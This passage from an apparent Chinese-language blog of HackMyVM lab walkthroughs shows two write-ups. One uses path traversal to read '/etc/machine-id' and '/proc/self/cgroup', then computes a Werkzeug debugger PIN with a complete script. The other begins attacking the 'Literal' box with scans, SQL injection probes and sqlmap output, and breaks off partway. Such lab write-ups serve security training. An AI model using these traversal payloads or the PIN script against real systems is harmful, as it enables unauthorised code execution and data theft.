    <span class="token keyword">def</span> <span class="token function">_generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span> <span class="token operator">|</span> <span class="token builtin">bytes</span> <span class="token operator">|</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        linux <span class="token operator">=</span> <span class="token string">b""</span>

        <span class="token comment"># machine-id is stable across boots, boot_id is not.</span>
        <span class="token keyword">for</span> filename <span class="token keyword">in</span> <span class="token string">"/etc/machine-id"</span><span class="token punctuation">,</span> <span class="token string">"/proc/sys/kernel/random/boot_id"</span><span class="token punctuation">:</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
                    value <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>
                <span class="token keyword">continue</span>

            <span class="token keyword">if</span> value<span class="token punctuation">:</span>
                linux <span class="token operator">+=</span> value
                <span class="token keyword">break</span>

        <span class="token comment"># Containers share the same machine id, add some cgroup</span>
        <span class="token comment"># information. This is used outside containers too but should be</span>
        <span class="token comment"># relatively stable across boots.</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/cgroup"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
                linux <span class="token operator">+=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rpartition<span class="token punctuation">(</span><span class="token string">b"/"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
        <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>
            <span class="token keyword">pass</span>

        <span class="token keyword">if</span> linux<span class="token punctuation">:</span>
            <span class="token keyword">return</span> linux</code></pre>
<p>可以看到显示读取&#x2F;etc&#x2F;machine-id和&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id其中的一个文件，如果&#x2F;etc&#x2F;machine-id有东西就会break,然后再拼接&#x2F;proc&#x2F;self&#x2F;cgroup里面的东西<br>先读取一下machine-id<br><img src="https://ooo.0x0.ooo/2024/07/13/OROubK.png" alt="OROubK.png" loading="lazy"></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">http://192.168.56.193:7777/download?filename<span class="token operator">=</span><span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/etc/machine-id
<span class="token comment">#f6791f240ce6407ea271e86b78ac3bdb</span></code></pre>
<p>这下不需要看&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id了<br>然后读&#x2F;proc&#x2F;self&#x2F;cgroup<br><img src="https://ooo.0x0.ooo/2024/07/13/OROIma.png" alt="OROIma.png" loading="lazy"></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">http://192.168.56.193:7777/download?filename<span class="token operator">=</span><span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/proc/self/cgroup
<span class="token comment">#0::/system.slice/flaskapp.service</span></code></pre>
<p>这里容易显示下载文件为空，需要多尝试,然后拼接一下</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># 模拟文件内容</span>
file_contents <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">"machine-id"</span><span class="token punctuation">:</span> <span class="token string">b"f6791f240ce6407ea271e86b78ac3bdb\n"</span><span class="token punctuation">,</span>
    <span class="token string">"boot_id"</span><span class="token punctuation">:</span> <span class="token string">b""</span><span class="token punctuation">,</span>
    <span class="token string">"cgroup"</span><span class="token punctuation">:</span> <span class="token string">b"0::/system.slice/flaskapp.service\n"</span>
<span class="token punctuation">&#125;</span>

machine_id <span class="token operator">=</span> <span class="token string">b""</span>

<span class="token keyword">for</span> filename <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">"machine-id"</span><span class="token punctuation">,</span> <span class="token string">"boot_id"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        value <span class="token operator">=</span> file_contents<span class="token punctuation">[</span>filename<span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> KeyError<span class="token punctuation">:</span>
        <span class="token keyword">continue</span>

    <span class="token keyword">if</span> value<span class="token punctuation">:</span>
        machine_id <span class="token operator">+=</span> value
        <span class="token keyword">break</span>

<span class="token keyword">try</span><span class="token punctuation">:</span>
    machine_id <span class="token operator">+=</span> file_contents<span class="token punctuation">[</span><span class="token string">"cgroup"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rpartition<span class="token punctuation">(</span><span class="token string">b"/"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
<span class="token keyword">except</span> KeyError<span class="token punctuation">:</span>
    <span class="token keyword">pass</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>machine_id<span class="token punctuation">)</span>
<span class="token comment">#f6791f240ce6407ea271e86b78ac3bdbflaskapp.service</span></code></pre>
<p>这下ok了，计算pin码,根据__init__.py文件可以看到是sha1哈希，所以sha1的脚本</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib
<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chain
 
probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">'www-data'</span>  
    <span class="token string">'flask.app'</span><span class="token punctuation">,</span>  
    <span class="token string">'Flask'</span><span class="token punctuation">,</span>  
    <span class="token string">'/opt/project/venv/lib/python3.11/site-packages/flask/app.py'</span>  
<span class="token punctuation">]</span>
 
private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">'8796759106009'</span><span class="token punctuation">,</span> 
    <span class="token string">'f6791f240ce6407ea271e86b78ac3bdbflaskapp.service'</span>
 
<span class="token punctuation">]</span>
 
h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>
        <span class="token keyword">continue</span>
    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>
h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'cookiesalt'</span><span class="token punctuation">)</span>
 
cookie_name <span class="token operator">=</span> <span class="token string">'__wzd'</span> <span class="token operator">+</span> h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span>
 
num <span class="token operator">=</span> <span class="token boolean">None</span>
<span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'pinsalt'</span><span class="token punctuation">)</span>
    num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%09d'</span> <span class="token operator">%</span> <span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>
 
rv <span class="token operator">=</span> <span class="token boolean">None</span>
<span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            rv <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>num<span class="token punctuation">[</span>x<span class="token punctuation">:</span>x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>
                          <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        rv <span class="token operator">=</span> num
 
<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span>
<span class="token comment">#124-291-339</span></code></pre>
<p>拿到pin码</p>
]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
  </entry>
  <entry>
    <title>HackMyVM-Literal</title>
    <url>/posts/42ff075e/</url>
    <content><![CDATA[<p><strong>难度:easy</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.189</strong></p>
<p>期末周，除了复习啥都想干，那就做个easy的靶机然后去复习</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> arp-scan <span class="token parameter variable">-l</span>
Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.56.104
Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.1    0a:00:27:00:00:05       <span class="token punctuation">(</span>Unknown: locally administered<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.100  08:00:27:1c:a8:4e       PCS Systemtechnik GmbH
<span class="token number">192.168</span>.56.189  08:00:27:4c:64:e1       PCS Systemtechnik GmbH

<span class="token number">3</span> packets received by filter, <span class="token number">0</span> packets dropped by kernel
Ending arp-scan <span class="token number">1.10</span>.0: <span class="token number">256</span> hosts scanned <span class="token keyword">in</span> <span class="token number">2.021</span> seconds <span class="token punctuation">(</span><span class="token number">126.67</span> hosts/sec<span class="token punctuation">)</span>. <span class="token number">3</span> responded</code></pre>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> nmap <span class="token number">192.168</span>.56.189
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-06-23 <span class="token number">11</span>:45 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.189
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.000095s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">998</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT   STATE SERVICE
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http
MAC Address: 08:00:27:4C:64:E1 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>

Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">0.14</span> seconds</code></pre>
<p>标准的22 80 端口，easy难度直接去web看吧</p>
<h2 id="web搜集"><a href="#web搜集" class="headerlink" title="web搜集"></a>web搜集</h2><p><img src="https://ooo.0x0.ooo/2024/06/23/OPztTr.png" alt="OPztTr.png" loading="lazy"><br>输入ip解析了域名那就添加hosts</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">192.168</span>.56.189 literal.hmv blog.literal.hmv</code></pre>
<p><img src="https://ooo.0x0.ooo/2024/06/23/OPz4vM.png" alt="OPz4vM.png" loading="lazy"><br>不是熟悉的cms<br>扫一下目录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> http://blog.literal.hmv <span class="token parameter variable">-x</span> html,txt,php,bak,zip <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Gobuster v3.6
by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:                     http://blog.literal.hmv
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Method:                  GET
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:                 <span class="token number">10</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Negative Status codes:   <span class="token number">404</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:              gobuster/3.6
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Extensions:              bak,zip,html,txt,php
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:                 10s
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Starting gobuster <span class="token keyword">in</span> directory enumeration mode
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
/.html                <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">281</span><span class="token punctuation">]</span>
/index.html           <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">3325</span><span class="token punctuation">]</span>
/images               <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">321</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://blog.literal.hmv/images/<span class="token punctuation">]</span>
/.php                 <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">281</span><span class="token punctuation">]</span>
/login.php            <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">1893</span><span class="token punctuation">]</span>
/register.php         <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">2159</span><span class="token punctuation">]</span>
/logout.php           <span class="token punctuation">(</span>Status: <span class="token number">302</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> login.php<span class="token punctuation">]</span>
/config.php           <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">0</span><span class="token punctuation">]</span>
/fonts                <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">320</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://blog.literal.hmv/fonts/<span class="token punctuation">]</span>
/dashboard.php        <span class="token punctuation">(</span>Status: <span class="token number">302</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> login.php<span class="token punctuation">]</span>
/.php                 <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">281</span><span class="token punctuation">]</span>
/.html                <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">281</span><span class="token punctuation">]</span>
/server-status        <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">281</span><span class="token punctuation">]</span></code></pre>
<p>有注册和登录界面<br><img src="https://ooo.0x0.ooo/2024/06/23/OPzDcG.png" alt="OPzDcG.png" loading="lazy"><br>随便注册一个号看看，好卡好卡<br><img src="https://ooo.0x0.ooo/2024/06/23/OPzLO1.png" alt="OPzLO1.png" loading="lazy"><br>去这个蓝色的链接看一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">next_projects_to_do.php</code></pre>
<p><img src="https://ooo.0x0.ooo/2024/06/23/OPzGLD.png" alt="OPzGLD.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/06/23/OPzE7I.png" alt="OPzE7I.png" loading="lazy"><br>输入个Done查询然后抓包，测试发现<code>Done&#39;#</code>和<code>Done</code>回显一样，并且<code>Done&#39;</code>报错，说明存在sql注入，用sqlmap跑一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> sqlmap <span class="token parameter variable">-l</span> a.txt <span class="token parameter variable">--batch</span> <span class="token parameter variable">--dbs</span>  
        ___
       __H__                                                                                                                                                                                                                                 
 ___ ___<span class="token punctuation">[</span>.<span class="token punctuation">]</span>_____ ___ ___  <span class="token punctuation">&#123;</span><span class="token number">1.8</span>.2<span class="token comment">#stable&#125;                                                                                                                                                                                                     </span>
<span class="token operator">|</span>_ -<span class="token operator">|</span> <span class="token builtin class-name">.</span> <span class="token punctuation">[</span><span class="token punctuation">)</span><span class="token punctuation">]</span>     <span class="token operator">|</span> <span class="token builtin class-name">.</span><span class="token string">'| . |                                                                                                                                                                                                                    
|___|_  [.]_|_|_|__,|  _|                                                                                                                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible <span class="token keyword">for</span> any misuse or damage caused by this program

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> starting @ <span class="token number">12</span>:22:25 /2024-06-23/

<span class="token punctuation">[</span><span class="token number">12</span>:22:25<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> sqlmap parsed <span class="token number">1</span> <span class="token punctuation">(</span>parameter unique<span class="token punctuation">)</span> requests from the targets list ready to be tested
<span class="token punctuation">[</span><span class="token number">1</span>/1<span class="token punctuation">]</span> URL:
GET http://blog.literal.hmv:80/next_projects_to_do.php
Cookie: <span class="token assign-left variable">PHPSESSID</span><span class="token operator">=</span>ccbhsfj6hk03lc0ddern711k9n
POST data: sentence-query<span class="token operator">=</span>Done
<span class="token keyword">do</span> you want to <span class="token builtin class-name">test</span> this URL? <span class="token punctuation">[</span>Y/n/q<span class="token punctuation">]</span>
<span class="token operator">></span> Y
<span class="token punctuation">[</span><span class="token number">12</span>:22:25<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing URL <span class="token string">'http://blog.literal.hmv:80/next_projects_to_do.php'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:22:25<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> using <span class="token string">'/root/.local/share/sqlmap/output/results-06232024_1222pm.csv'</span> as the CSV results <span class="token function">file</span> <span class="token keyword">in</span> multiple targets mode
<span class="token punctuation">[</span><span class="token number">12</span>:22:25<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing connection to the target URL
<span class="token punctuation">[</span><span class="token number">12</span>:22:25<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token keyword">if</span> the target URL content is stable
<span class="token punctuation">[</span><span class="token number">12</span>:22:25<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> target URL content is stable
<span class="token punctuation">[</span><span class="token number">12</span>:22:25<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token keyword">if</span> POST parameter <span class="token string">'sentence-query'</span> is dynamic
<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> POST parameter <span class="token string">'sentence-query'</span> appears to be dynamic
<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> heuristic <span class="token punctuation">(</span>basic<span class="token punctuation">)</span> <span class="token builtin class-name">test</span> shows that POST parameter <span class="token string">'sentence-query'</span> might not be injectable
<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token keyword">for</span> SQL injection on POST parameter <span class="token string">'sentence-query'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'AND boolean-based blind - WHERE or HAVING clause'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> POST parameter <span class="token string">'sentence-query'</span> appears to be <span class="token string">'AND boolean-based blind - WHERE or HAVING clause'</span> injectable <span class="token punctuation">(</span>with <span class="token parameter variable">--string</span><span class="token operator">=</span><span class="token string">"11"</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> heuristic <span class="token punctuation">(</span>extended<span class="token punctuation">)</span> <span class="token builtin class-name">test</span> shows that the back-end DBMS could be <span class="token string">'MySQL'</span> 
it looks like the back-end DBMS is <span class="token string">'MySQL'</span><span class="token builtin class-name">.</span> Do you want to skip <span class="token builtin class-name">test</span> payloads specific <span class="token keyword">for</span> other DBMSes? <span class="token punctuation">[</span>Y/n<span class="token punctuation">]</span> Y
<span class="token keyword">for</span> the remaining tests, <span class="token keyword">do</span> you want to include all tests <span class="token keyword">for</span> <span class="token string">'MySQL'</span> extending provided level <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> and risk <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> values? <span class="token punctuation">[</span>Y/n<span class="token punctuation">]</span> Y
<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'</span>
<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'</span>
